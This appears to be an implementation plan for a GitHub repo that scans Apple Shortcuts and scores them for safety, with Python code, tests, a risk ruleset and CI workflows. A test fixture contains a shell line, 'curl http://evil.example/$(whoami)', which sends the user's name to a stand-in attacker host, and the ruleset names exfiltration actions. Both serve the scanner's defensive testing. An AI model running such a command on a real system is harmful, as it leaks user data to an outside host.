# awesome-shortcuts Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build a community GitHub repo of Apple Shortcuts where every shortcut is automatically decompiled, scanned for dangerous actions, and given a 0–100 safety score + 🟢/🟡/🔴 badge.

**Architecture:** Pure-Python tooling (`decompile.py` → `scan.py` → `build_readme.py`) composed by GitHub Actions. Shortcuts are stored as human-readable XML plists (the source of truth) plus metadata; CI decompiles iCloud submissions, scans them against a risk ruleset, and regenerates the README leaderboard. Canonical repo `awesome-shortcuts` push-mirrors to `sexy-shortcuts`.

**Tech Stack:** Python 3 (stdlib `plistlib`, `urllib`, `re`, `json`), PyYAML, pytest, macOS `plutil`/`aea`, GitHub Actions.

**Spec:** `docs/superpowers/specs/2026-06-09-awesome-shortcuts-design.md`

---

### Task 1: Project scaffolding

**Files:**
- Create: `requirements.txt`
- Create: `pytest.ini`
- Create: `scripts/__init__.py`
- Create: `tests/__init__.py`
- Create: `tests/fixtures/.gitkeep`
- Create: `shortcuts/.gitkeep`

- [ ] **Step 1: Create requirements.txt**

```
PyYAML>=6.0
pytest>=8.0
```

- [ ] **Step 2: Create pytest.ini**

```ini
[pytest]
testpaths = tests
python_files = test_*.py
markers =
    network: tests that require network access (deselect with -m "not network")
```

- [ ] **Step 3: Create empty package/dir markers**

Create `scripts/__init__.py`, `tests/__init__.py`, `tests/fixtures/.gitkeep`, `shortcuts/.gitkeep` as empty files.

- [ ] **Step 4: Install deps and verify pytest runs**

Run: `cd ~/awesome-shortcuts && python3 -m pip install -r requirements.txt && python3 -m pytest -q`
Expected: `no tests ran` (exit 5) — confirms pytest is installed and discovers the empty tree.

- [ ] **Step 5: Commit**

```bash
git add -A
git commit -m "chore: scaffold python tooling + pytest"
```

---

### Task 2: iOS 27 decompile validation gate (manual, blocking)

This proves the core assumption before any code is built on it. No TDD — it is an investigation with a documented result. **If both paths fail, STOP and escalate; the design needs revisiting.**

**Files:**
- Create: `docs/decompile-validation.md` (records the result)

- [ ] **Step 1: Validate the unsigned-file path**

Obtain one real iOS 27 shortcut exported unsigned (Shortcuts.app on macOS: select a shortcut → File → Export… if available, or an unsigned `.shortcut` from `~/Library/Shortcuts/`). Then:

```bash
cp "/path/to/Some Shortcut.shortcut" /tmp/s.plist
plutil -convert xml1 -o /tmp/s.xml /tmp/s.plist
grep -c WFWorkflowActions /tmp/s.xml
```
Expected: prints `1` (the plist contains a `WFWorkflowActions` array).

- [ ] **Step 2: Validate the iCloud-link path**

Create a shortcut, share it to get an `https://www.icloud.com/shortcuts/<ID>` link, then:

```bash
ID="<paste the ID>"
curl -sL "https://www.icloud.com/shortcuts/api/records/$ID" -o /tmp/rec.json
python3 -c "import json;d=json.load(open('/tmp/rec.json'));print(d['fields']['shortcut']['value']['downloadURL'])"
```
Expected: prints a downloadable URL. Then download it and confirm it converts:
```bash
DL="<the printed URL>"; curl -sL "$DL" -o /tmp/dl.plist
plutil -convert xml1 -o /tmp/dl.xml /tmp/dl.plist && grep -c WFWorkflowActions /tmp/dl.xml
```
Expected: prints `1`.

- [ ] **Step 3: Record the result**

Write `docs/decompile-validation.md` documenting: iOS 27 version tested, whether each path worked, the exact JSON key path used for the iCloud download URL (it may differ on iOS 27 — record the real one), and any deviations. If a path failed, document the failure and the chosen fallback (per spec §11: store readable plist + link only).

- [ ] **Step 4: Commit**

```bash
git add docs/decompile-validation.md
git commit -m "docs: record iOS 27 decompile validation result"
```

---

### Task 3: Build test fixtures (sample shortcut plists)

**Files:**
- Create: `tests/fixtures/green_text.plist`
- Create: `tests/fixtures/yellow_contacts.plist`
- Create: `tests/fixtures/red_shell.plist`

- [ ] **Step 1: Create the green fixture (text/format only)**

`tests/fixtures/green_text.plist`:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>WFWorkflowActions</key>
	<array>
		<dict>
			<key>WFWorkflowActionIdentifier</key>
			<string>is.workflow.actions.gettext</string>
			<key>WFWorkflowActionParameters</key>
			<dict><key>WFTextActionText</key><string>Hello</string></dict>
		</dict>
		<dict>
			<key>WFWorkflowActionIdentifier</key>
			<string>is.workflow.actions.showresult</string>
			<key>WFWorkflowActionParameters</key>
			<dict/>
		</dict>
	</array>
</dict>
</plist>
```

- [ ] **Step 2: Create the yellow fixture (reads contacts)**

`tests/fixtures/yellow_contacts.plist`:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>WFWorkflowActions</key>
	<array>
		<dict>
			<key>WFWorkflowActionIdentifier</key>
			<string>is.workflow.actions.getmycontacts</string>
			<key>WFWorkflowActionParameters</key>
			<dict/>
		</dict>
	</array>
</dict>
</plist>
```

- [ ] **Step 3: Create the red fixture (run shell script)**

`tests/fixtures/red_shell.plist`:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>WFWorkflowActions</key>
	<array>
		<dict>
			<key>WFWorkflowActionIdentifier</key>
			<string>is.workflow.actions.runshellscript</string>
			<key>WFWorkflowActionParameters</key>
			<dict><key>Script</key><string>curl http://evil.example/$(whoami)</string></dict>
		</dict>
	</array>
</dict>
</plist>
```

- [ ] **Step 4: Verify fixtures are valid plists**

Run: `for f in tests/fixtures/*.plist; do plutil -lint "$f"; done`
Expected: each prints `OK`.

- [ ] **Step 5: Commit**

```bash
git add tests/fixtures/*.plist
git commit -m "test: add green/yellow/red shortcut plist fixtures"
```

---

### Task 4: Risk ruleset

**Files:**
- Create: `scripts/risk_rules.yml`

- [ ] **Step 1: Create the ruleset**

`scripts/risk_rules.yml`:
```yaml
# Each rule maps a Shortcuts action identifier to a risk tier, a score penalty,
# and a human-readable reason shown in SAFETY.md. Tiers: red > yellow > green.
default_unknown:
  tier: yellow
  weight: 10
  reason: "Unrecognized action — treated as medium risk until reviewed."
rules:
  - id: is.workflow.actions.runshellscript
    tier: red
    weight: 60
    reason: "Runs a shell script — arbitrary code execution on macOS."
  - id: is.workflow.actions.runsshscript
    tier: red
    weight: 60
    reason: "Runs commands on a remote host over SSH."
  - id: is.workflow.actions.runjavascriptonwebpage
    tier: red
    weight: 40
    reason: "Injects and runs JavaScript in a web page."
  - id: is.workflow.actions.downloadurl
    tier: yellow
    weight: 20
    reason: "Sends a network request / downloads from a URL — possible exfiltration."
  - id: is.workflow.actions.getmycontacts
    tier: yellow
    weight: 15
    reason: "Reads your contacts."
  - id: is.workflow.actions.getcurrentlocation
    tier: yellow
    weight: 15
    reason: "Reads your current location."
  - id: is.workflow.actions.getclipboard
    tier: yellow
    weight: 15
    reason: "Reads the clipboard contents."
  - id: is.workflow.actions.openapp
    tier: yellow
    weight: 5
    reason: "Opens another app."
  - id: is.workflow.actions.gettext
    tier: green
    weight: 0
    reason: "Creates static text."
  - id: is.workflow.actions.showresult
    tier: green
    weight: 0
    reason: "Shows a result on screen."
```

- [ ] **Step 2: Verify it parses**

Run: `python3 -c "import yaml;d=yaml.safe_load(open('scripts/risk_rules.yml'));print(len(d['rules']),'rules')"`
Expected: `10 rules`

- [ ] **Step 3: Commit**

```bash
git add scripts/risk_rules.yml
git commit -m "feat: add safety risk ruleset"
```

---

### Task 5: scan.py — scoring engine

**Files:**
- Create: `scripts/scan.py`
- Test: `tests/test_scan.py`

- [ ] **Step 1: Write the failing tests**

`tests/test_scan.py`:
```python
from pathlib import Path
from scripts.scan import scan_plist

FIX = Path(__file__).parent / "fixtures"
RULES = Path(__file__).parents[1] / "scripts" / "risk_rules.yml"

def test_green_shortcut_scores_100_and_green():
    r = scan_plist(FIX / "green_text.plist", RULES)
    assert r["tier"] == "green"
    assert r["badge"] == "green"
    assert r["score"] == 100
    assert r["findings"] == []

def test_yellow_shortcut_is_yellow_with_penalty():
    r = scan_plist(FIX / "yellow_contacts.plist", RULES)
    assert r["tier"] == "yellow"
    assert r["score"] == 85
    assert any(f["id"] == "is.workflow.actions.getmycontacts" for f in r["findings"])

def test_red_shortcut_is_red():
    r = scan_plist(FIX / "red_shell.plist", RULES)
    assert r["tier"] == "red"
    assert r["badge"] == "red"
    assert r["score"] == 40
    assert r["findings"][0]["reason"].startswith("Runs a shell script")

def test_unknown_action_treated_as_yellow(tmp_path):
    p = tmp_path / "unk.plist"
    p.write_text(
        '<?xml version="1.0"?><!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" '
        '"http://www.apple.com/DTDs/PropertyList-1.0.dtd"><plist version="1.0"><dict>'
        '<key>WFWorkflowActions</key><array><dict>'
        '<key>WFWorkflowActionIdentifier</key><string>is.workflow.actions.madeup</string>'
        '<key>WFWorkflowActionParameters</key><dict/></dict></array></dict></plist>'
    )
    r = scan_plist(p, RULES)
    assert r["tier"] == "yellow"
    assert r["score"] == 90
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `python3 -m pytest tests/test_scan.py -v`
Expected: FAIL with `ModuleNotFoundError: No module named 'scripts.scan'`

- [ ] **Step 3: Implement scan.py**

`scripts/scan.py`:
```python
"""Decompile-free static scanner: reads a Shortcuts plist, matches each action
against the risk ruleset, returns a tier, a 0-100 score, and findings."""
import plistlib
import sys
from pathlib import Path

import yaml

TIER_ORDER = {"green": 0, "yellow": 1, "red": 2}


def _load_rules(rules_path):
    data = yaml.safe_load(Path(rules_path).read_text())
    by_id = {r["id"]: r for r in data["rules"]}
    return by_id, data["default_unknown"]


def scan_plist(plist_path, rules_path):
    by_id, unknown = _load_rules(rules_path)
    with open(plist_path, "rb") as fh:
        doc = plistlib.load(fh)
    actions = doc.get("WFWorkflowActions", [])

    findings = []
    penalty = 0
    worst = "green"
    for action in actions:
        ident = action.get("WFWorkflowActionIdentifier", "")
        rule = by_id.get(ident)
        if rule is None:
            rule = {**unknown, "id": ident}
        if rule["tier"] == "green" and rule["weight"] == 0:
            continue
        findings.append({"id": rule["id"], "tier": rule["tier"],
                         "weight": rule["weight"], "reason": rule["reason"]})
        penalty += rule["weight"]
        if TIER_ORDER[rule["tier"]] > TIER_ORDER[worst]:
            worst = rule["tier"]

    score = max(0, 100 - penalty)
    return {"score": score, "tier": worst, "badge": worst, "findings": findings}


if __name__ == "__main__":
    import json
    rules = Path(__file__).with_name("risk_rules.yml")
    print(json.dumps(scan_plist(sys.argv[1], rules), indent=2))
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `python3 -m pytest tests/test_scan.py -v`
Expected: 4 passed.

- [ ] **Step 5: Commit**

```bash
git add scripts/scan.py tests/test_scan.py
git commit -m "feat: add static safety scanner with scoring"
```

---

### Task 6: decompile.py — iCloud URL transform + plist→XML

**Files:**
- Create: `scripts/decompile.py`
- Test: `tests/test_decompile.py`

- [ ] **Step 1: Write the failing tests**

`tests/test_decompile.py`:
```python
import plistlib
from pathlib import Path

import pytest

from scripts.decompile import icloud_record_url, plist_to_xml, extract_shortcut_id

FIX = Path(__file__).parent / "fixtures"

def test_extract_shortcut_id_from_share_url():
    url = "https://www.icloud.com/shortcuts/abc123DEF456"
    assert extract_shortcut_id(url) == "abc123DEF456"

def test_extract_shortcut_id_with_trailing_slash():
    url = "https://www.icloud.com/shortcuts/abc123/"
    assert extract_shortcut_id(url) == "abc123"

def test_extract_shortcut_id_rejects_non_icloud():
    with pytest.raises(ValueError):
        extract_shortcut_id("https://example.com/foo")

def test_icloud_record_url():
    url = "https://www.icloud.com/shortcuts/abc123"
    assert icloud_record_url(url) == "https://www.icloud.com/shortcuts/api/records/abc123"

def test_plist_to_xml_roundtrips(tmp_path):
    out = tmp_path / "out.xml"
    plist_to_xml(FIX / "green_text.plist", out)
    text = out.read_text()
    assert "WFWorkflowActions" in text
    assert text.lstrip().startswith("<?xml")
    # And it is still a valid plist we can re-load:
    with open(out, "rb") as fh:
        doc = plistlib.load(fh)
    assert "WFWorkflowActions" in doc
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `python3 -m pytest tests/test_decompile.py -v`
Expected: FAIL with `ModuleNotFoundError: No module named 'scripts.decompile'`

- [ ] **Step 3: Implement decompile.py**

`scripts/decompile.py`:
```python
"""Turn an iCloud shortcut link (or an unsigned .shortcut/.plist file) into a
human-readable XML plist on disk. Network fetch is isolated in fetch_unsigned_plist
so the pure transforms stay unit-testable."""
import plistlib
import re
import sys
import urllib.request
from pathlib import Path

_ID_RE = re.compile(r"^https?://(?:www\.)?icloud\.com/shortcuts/([A-Za-z0-9]+)/?$")


def extract_shortcut_id(share_url):
    m = _ID_RE.match(share_url.strip())
    if not m:
        raise ValueError(f"Not an iCloud shortcut link: {share_url!r}")
    return m.group(1)


def icloud_record_url(share_url):
    return f"https://www.icloud.com/shortcuts/api/records/{extract_shortcut_id(share_url)}"


def plist_to_xml(src_path, dest_path):
    """Read any plist (binary or XML) and write it back as XML1."""
    with open(src_path, "rb") as fh:
        doc = plistlib.load(fh)
    with open(dest_path, "wb") as fh:
        plistlib.dump(doc, fh)  # plistlib defaults to XML format
    return dest_path


def fetch_unsigned_plist(share_url, dest_path):  # pragma: no cover - network
    """Fetch the unsigned shortcut bytes for an iCloud link and write XML to dest.
    NOTE: confirm the JSON key path against docs/decompile-validation.md for iOS 27."""
    import json
    rec_url = icloud_record_url(share_url)
    with urllib.request.urlopen(rec_url, timeout=30) as resp:
        record = json.load(resp)
    download_url = record["fields"]["shortcut"]["value"]["downloadURL"]
    with urllib.request.urlopen(download_url, timeout=30) as resp:
        raw = resp.read()
    doc = plistlib.loads(raw)
    with open(dest_path, "wb") as fh:
        plistlib.dump(doc, fh)
    return dest_path


if __name__ == "__main__":
    src, dest = sys.argv[1], sys.argv[2]
    if src.startswith("http"):
        fetch_unsigned_plist(src, dest)
    else:
        plist_to_xml(src, dest)
    print(f"wrote {dest}")
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `python3 -m pytest tests/test_decompile.py -v`
Expected: 5 passed.

- [ ] **Step 5: Commit**

```bash
git add scripts/decompile.py tests/test_decompile.py
git commit -m "feat: add decompile (icloud url transform + plist->xml)"
```

---

### Task 7: build_readme.py — leaderboard + per-shortcut SAFETY.md

**Files:**
- Create: `scripts/build_readme.py`
- Test: `tests/test_build_readme.py`

- [ ] **Step 1: Write the failing tests**

`tests/test_build_readme.py`:
```python
from pathlib import Path
from scripts.build_readme import render_readme, render_safety

def _entry(slug, name, score, tier, category):
    return {
        "slug": slug, "name": name, "category": category,
        "description": f"{name} desc", "source": "https://www.icloud.com/shortcuts/x",
        "scan": {"score": score, "tier": tier, "badge": tier, "findings": []},
    }

def test_render_readme_sorts_by_score_desc_and_shows_badges():
    entries = [
        _entry("a", "Alpha", 70, "yellow", "Productivity"),
        _entry("b", "Bravo", 100, "green", "Productivity"),
    ]
    md = render_readme(entries)
    assert md.index("Bravo") < md.index("Alpha")  # higher score first
    assert "🟢" in md and "🟡" in md
    assert "| Score |" in md  # table header present

def test_render_safety_lists_findings():
    e = _entry("c", "Charlie", 40, "red", "Utilities")
    e["scan"]["findings"] = [{"id": "is.workflow.actions.runshellscript",
                              "tier": "red", "weight": 60,
                              "reason": "Runs a shell script — arbitrary code execution on macOS."}]
    md = render_safety(e)
    assert "🔴" in md
    assert "Score: 40/100" in md
    assert "Runs a shell script" in md
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `python3 -m pytest tests/test_build_readme.py -v`
Expected: FAIL with `ModuleNotFoundError: No module named 'scripts.build_readme'`

- [ ] **Step 3: Implement build_readme.py**

`scripts/build_readme.py`:
```python
"""Generate the README leaderboard and per-shortcut SAFETY.md from each
shortcut's meta.yml + scan.json. Pure render functions are unit-tested; the
filesystem glue (load_entries / main) walks shortcuts/<slug>/."""
import json
from pathlib import Path

import yaml

BADGE = {"green": "🟢", "yellow": "🟡", "red": "🔴"}
ROOT = Path(__file__).parents[1]


def render_safety(entry):
    s = entry["scan"]
    lines = [
        f"# Safety report: {entry['name']}",
        "",
        f"{BADGE[s['badge']]} **{s['tier'].upper()}** — Score: {s['score']}/100",
        "",
        "> This score reflects which capabilities the shortcut requests, not proof of intent.",
        "",
    ]
    if s["findings"]:
        lines.append("## Flagged actions")
        for f in s["findings"]:
            lines.append(f"- {BADGE[f['tier']]} `{f['id']}` (−{f['weight']}): {f['reason']}")
    else:
        lines.append("No flagged actions — device-local only.")
    return "\n".join(lines) + "\n"


def render_readme(entries):
    rows = sorted(entries, key=lambda e: e["scan"]["score"], reverse=True)
    out = [
        "# awesome-shortcuts",
        "",
        "The only Apple Shortcuts collection where every shortcut is decompiled and",
        "scored for safety. Each score reflects what a shortcut *can do*, not proof of intent.",
        "",
        "| Safety | Score | Shortcut | Category | What it does |",
        "| :----: | :---: | -------- | -------- | ------------ |",
    ]
    for e in rows:
        s = e["scan"]
        out.append(
            f"| {BADGE[s['badge']]} | {s['score']} | "
            f"[{e['name']}](shortcuts/{e['slug']}/) | {e['category']} | {e['description']} |"
        )
    return "\n".join(out) + "\n"


def load_entries(shortcuts_dir=ROOT / "shortcuts"):
    entries = []
    for meta_path in sorted(Path(shortcuts_dir).glob("*/meta.yml")):
        d = meta_path.parent
        entry = yaml.safe_load(meta_path.read_text())
        entry["scan"] = json.loads((d / "scan.json").read_text())
        entries.append(entry)
    return entries


def main():  # pragma: no cover - filesystem glue
    entries = load_entries()
    (ROOT / "README.md").write_text(render_readme(entries))
    for e in entries:
        (ROOT / "shortcuts" / e["slug"] / "SAFETY.md").write_text(render_safety(e))
    print(f"rebuilt README + {len(entries)} SAFETY.md files")


if __name__ == "__main__":
    main()
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `python3 -m pytest tests/test_build_readme.py -v`
Expected: 2 passed.

- [ ] **Step 5: Commit**

```bash
git add scripts/build_readme.py tests/test_build_readme.py
git commit -m "feat: add README leaderboard + SAFETY.md generation"
```

---

### Task 8: vet_pr.py — orchestrator that scans every shortcut and fails on red

**Files:**
- Create: `scripts/vet_pr.py`
- Test: `tests/test_vet_pr.py`

- [ ] **Step 1: Write the failing test**

`tests/test_vet_pr.py`:
```python
from pathlib import Path
from scripts.vet_pr import vet_directory

FIX = Path(__file__).parent / "fixtures"
RULES = Path(__file__).parents[1] / "scripts" / "risk_rules.yml"

def test_vet_directory_returns_red_for_shell(tmp_path):
    sc = tmp_path / "shortcuts" / "bad"
    sc.mkdir(parents=True)
    (sc / "shortcut.plist").write_bytes((FIX / "red_shell.plist").read_bytes())
    results, has_red = vet_directory(tmp_path / "shortcuts", RULES)
    assert has_red is True
    assert results["bad"]["tier"] == "red"

def test_vet_directory_clean_for_green(tmp_path):
    sc = tmp_path / "shortcuts" / "ok"
    sc.mkdir(parents=True)
    (sc / "shortcut.plist").write_bytes((FIX / "green_text.plist").read_bytes())
    results, has_red = vet_directory(tmp_path / "shortcuts", RULES)
    assert has_red is False
    assert results["ok"]["score"] == 100
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python3 -m pytest tests/test_vet_pr.py -v`
Expected: FAIL with `ModuleNotFoundError: No module named 'scripts.vet_pr'`

- [ ] **Step 3: Implement vet_pr.py**

`scripts/vet_pr.py`:
```python
"""Scan every shortcuts/<slug>/shortcut.plist, write scan.json next to each, and
exit non-zero if any shortcut is red (blocks auto-merge). Run by CI on each PR."""
import json
import sys
from pathlib import Path

from scripts.scan import scan_plist

ROOT = Path(__file__).parents[1]
RULES = Path(__file__).with_name("risk_rules.yml")


def vet_directory(shortcuts_dir, rules_path=RULES):
    results = {}
    has_red = False
    for plist in sorted(Path(shortcuts_dir).glob("*/shortcut.plist")):
        slug = plist.parent.name
        r = scan_plist(plist, rules_path)
        (plist.parent / "scan.json").write_text(json.dumps(r, indent=2))
        results[slug] = r
        if r["tier"] == "red":
            has_red = True
    return results, has_red


def main():  # pragma: no cover - CI glue
    results, has_red = vet_directory(ROOT / "shortcuts")
    for slug, r in results.items():
        print(f"{r['badge']:>6}  {r['score']:>3}  {slug}")
    if has_red:
        print("::error::One or more shortcuts are RED. Maintainer override required.")
        sys.exit(1)


if __name__ == "__main__":
    main()
```

- [ ] **Step 4: Run test to verify it passes**

Run: `python3 -m pytest tests/test_vet_pr.py -v`
Expected: 2 passed.

- [ ] **Step 5: Run the full suite**

Run: `python3 -m pytest -q`
Expected: all tests pass (13 total).

- [ ] **Step 6: Commit**

```bash
git add scripts/vet_pr.py tests/test_vet_pr.py
git commit -m "feat: add PR vetting orchestrator (fails on red)"
```

---

### Task 9: Seed one example shortcut end-to-end

**Files:**
- Create: `shortcuts/show-clipboard/shortcut.plist`
- Create: `shortcuts/show-clipboard/meta.yml`

- [ ] **Step 1: Add the example plist**

`shortcuts/show-clipboard/shortcut.plist`:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>WFWorkflowActions</key>
	<array>
		<dict>
			<key>WFWorkflowActionIdentifier</key>
			<string>is.workflow.actions.getclipboard</string>
			<key>WFWorkflowActionParameters</key>
			<dict/>
		</dict>
		<dict>
			<key>WFWorkflowActionIdentifier</key>
			<string>is.workflow.actions.showresult</string>
			<key>WFWorkflowActionParameters</key>
			<dict/>
		</dict>
	</array>
</dict>
</plist>
```

- [ ] **Step 2: Add metadata**

`shortcuts/show-clipboard/meta.yml`:
```yaml
name: "Show Clipboard"
slug: show-clipboard
author: "Anh Nguyen"
category: "Utilities"
source: "https://www.icloud.com/shortcuts/REPLACE_WITH_REAL_ID"
description: "Displays the current clipboard contents."
date_added: "2026-06-09"
tags: [clipboard, utility]
```

- [ ] **Step 3: Generate scan.json, README, and SAFETY.md**

Run: `cd ~/awesome-shortcuts && python3 -m scripts.vet_pr && python3 -m scripts.build_readme`
Expected: prints `yellow  85  show-clipboard` then `rebuilt README + 1 SAFETY.md files`. Confirm `README.md`, `shortcuts/show-clipboard/scan.json`, and `shortcuts/show-clipboard/SAFETY.md` now exist.

- [ ] **Step 4: Eyeball the output**

Run: `cat README.md && echo '---' && cat shortcuts/show-clipboard/SAFETY.md`
Expected: README table shows 🟡 / 85 for Show Clipboard; SAFETY.md lists the `getclipboard` finding.

- [ ] **Step 5: Commit**

```bash
git add shortcuts/show-clipboard README.md
git commit -m "feat: seed Show Clipboard example + generate README/SAFETY"
```

---

### Task 10: GitHub Actions — vet, index, mirror

**Files:**
- Create: `.github/workflows/vet.yml`
- Create: `.github/workflows/index.yml`
- Create: `.github/workflows/mirror.yml`

- [ ] **Step 1: Create vet.yml (runs on PRs)**

`.github/workflows/vet.yml`:
```yaml
name: Vet shortcuts
on:
  pull_request:
    paths: ["shortcuts/**"]
jobs:
  vet:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with: { python-version: "3.12" }
      - run: pip install -r requirements.txt
      - run: python -m pytest -q -m "not network"
      - run: python -m scripts.vet_pr
```

- [ ] **Step 2: Create index.yml (rebuilds README on merge)**

`.github/workflows/index.yml`:
```yaml
name: Rebuild index
on:
  push:
    branches: [main]
    paths: ["shortcuts/**"]
permissions:
  contents: write
jobs:
  index:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with: { python-version: "3.12" }
      - run: pip install -r requirements.txt
      - run: python -m scripts.vet_pr && python -m scripts.build_readme
      - run: |
          git config user.name "github-actions[bot]"
          git config user.email "github-actions[bot]@users.noreply.github.com"
          git add README.md shortcuts/**/scan.json shortcuts/**/SAFETY.md
          git diff --cached --quiet || git commit -m "chore: rebuild index [skip ci]"
          git push
```

- [ ] **Step 3: Create mirror.yml (push-mirror to sexy-shortcuts)**

`.github/workflows/mirror.yml`:
```yaml
name: Mirror to sexy-shortcuts
on:
  push:
    branches: [main]
jobs:
  mirror:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with: { fetch-depth: 0 }
      - name: Push mirror
        env:
          MIRROR_TOKEN: ${{ secrets.MIRROR_TOKEN }}
        run: |
          git push --force "https://x-access-token:${MIRROR_TOKEN}@github.com/<OWNER>/sexy-shortcuts.git" main:main
```
> Setup note: create a `MIRROR_TOKEN` repo secret (a PAT or fine-grained token with `contents:write` on `sexy-shortcuts`) and replace `<OWNER>`.

- [ ] **Step 4: Validate workflow YAML**

Run: `python3 -c "import yaml,glob; [yaml.safe_load(open(f)) for f in glob.glob('.github/workflows/*.yml')]; print('all workflows parse')"`
Expected: `all workflows parse`

- [ ] **Step 5: Commit**

```bash
git add .github/workflows
git commit -m "ci: add vet, index, and mirror workflows"
```

---

### Task 11: Contributor docs — issue template, CONTRIBUTING, README intro

**Files:**
- Create: `.github/ISSUE_TEMPLATE/submit-shortcut.yml`
- Create: `CONTRIBUTING.md`
- Create: `docs/why-shortcuts.md` (lift §0 from the spec; README links to it)

- [ ] **Step 1: Create the submission issue template**

`.github/ISSUE_TEMPLATE/submit-shortcut.yml`:
```yaml
name: Submit a shortcut
description: Propose a shortcut for the collection (paste an iCloud link — CI does the rest).
labels: ["submission"]
body:
  - type: input
    id: icloud
    attributes: { label: iCloud share link, placeholder: "https://www.icloud.com/shortcuts/..." }
    validations: { required: true }
  - type: input
    id: name
    attributes: { label: Shortcut name }
    validations: { required: true }
  - type: dropdown
    id: category
    attributes:
      label: Category
      options: [Productivity, Utilities, Media, Health, Home, Developer, Fun]
    validations: { required: true }
  - type: textarea
    id: description
    attributes: { label: What does it do? }
    validations: { required: true }
```

- [ ] **Step 2: Create CONTRIBUTING.md**

`CONTRIBUTING.md`:
```markdown
# Contributing

1. Open a **Submit a shortcut** issue and paste your iCloud share link.
2. CI fetches the unsigned shortcut, decompiles it, and posts a safety score.
3. A maintainer reviews the flagged actions and, if accepted, opens a PR that adds
   `shortcuts/<slug>/` with the frozen `shortcut.plist`, `meta.yml`, and `scan.json`.
4. On merge, the README leaderboard and `SAFETY.md` regenerate automatically.

**Safety rules**
- 🔴 Red shortcuts (shell/SSH/JS execution, exfiltration) are blocked from auto-merge
  and require a documented maintainer override.
- The score reflects what a shortcut *can do* — it is not proof of intent. Always read
  the shortcut's `SAFETY.md` before importing.
```

- [ ] **Step 3: Add the Why-Shortcuts doc**

Copy section 0 of `docs/superpowers/specs/2026-06-09-awesome-shortcuts-design.md` into `docs/why-shortcuts.md` (drop the internal "Tone note" blockquotes). Add a link to it near the top of `README.md` via `render_readme` intro text — update the intro line in `scripts/build_readme.py` to include `"See [Why Shortcuts?](docs/why-shortcuts.md) for the privacy/security case."` and regenerate.

- [ ] **Step 4: Regenerate and verify README links**

Run: `python3 -m scripts.build_readme && grep -q "Why Shortcuts" README.md && echo OK`
Expected: `OK`

- [ ] **Step 5: Commit**

```bash
git add .github/ISSUE_TEMPLATE CONTRIBUTING.md docs/why-shortcuts.md README.md scripts/build_readme.py
git commit -m "docs: add issue template, CONTRIBUTING, why-shortcuts"
```

---

### Task 12: Publish + create the mirror

This task is operational (requires `gh` auth + the user's GitHub account). Pause and confirm with the user before running — creating public repos is outward-facing.

- [ ] **Step 1: Create the canonical repo**

Run: `cd ~/awesome-shortcuts && gh repo create awesome-shortcuts --public --source=. --remote=origin --description "The only Apple Shortcuts collection where every shortcut is scored for safety." --push`
Expected: repo created and pushed.

- [ ] **Step 2: Create the mirror repo**

Run: `gh repo create sexy-shortcuts --public --description "Mirror of awesome-shortcuts (curated favorites)."`
Expected: empty repo created.

- [ ] **Step 3: Add the mirror token secret**

Create a fine-grained PAT with `contents:write` on `sexy-shortcuts`, then:
Run: `gh secret set MIRROR_TOKEN --repo <OWNER>/awesome-shortcuts`
Paste the token when prompted.

- [ ] **Step 4: Set discovery topics**

Run: `gh repo edit <OWNER>/awesome-shortcuts --add-topic apple-shortcuts --add-topic ios-shortcuts --add-topic siri-shortcuts --add-topic shortcuts-app`
Expected: topics added.

- [ ] **Step 5: Trigger and verify the mirror**

Push a trivial commit to `main`, then confirm `sexy-shortcuts` received it:
Run: `gh repo view <OWNER>/sexy-shortcuts --json pushedAt`
Expected: a recent `pushedAt` timestamp.

---

### Task 13: reelkit.py — turn a shortcut into a ready-to-post content kit

**Files:**
- Create: `scripts/reelkit.py`
- Test: `tests/test_reelkit.py`

- [ ] **Step 1: Write the failing tests**

`tests/test_reelkit.py`:
```python
from scripts.reelkit import build_kit

ENTRY = {
    "name": "Show Clipboard", "slug": "show-clipboard", "category": "Utilities",
    "description": "Displays the current clipboard contents.",
    "source": "https://www.icloud.com/shortcuts/abc123",
    "scan": {"score": 85, "tier": "yellow", "badge": "yellow", "findings": []},
}

def test_kit_has_caption_badge_and_cta():
    kit = build_kit(ENTRY)
    assert "🟡" in kit["caption"]
    assert "85/100" in kit["caption"]
    assert "link in bio" in kit["caption"].lower()
    assert ENTRY["source"] in kit["caption"]

def test_kit_hashtags_include_core_and_category():
    kit = build_kit(ENTRY)
    tags = " ".join(kit["hashtags"]).lower()
    assert "#shortcuts" in tags
    assert "#utilities" in tags
    assert all(t.startswith("#") for t in kit["hashtags"])

def test_kit_overlay_has_three_beats():
    kit = build_kit(ENTRY)
    assert len(kit["overlay"]) == 3  # hook / payoff / cta
    assert "Show Clipboard" in kit["overlay"][1]
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `python3 -m pytest tests/test_reelkit.py -v`
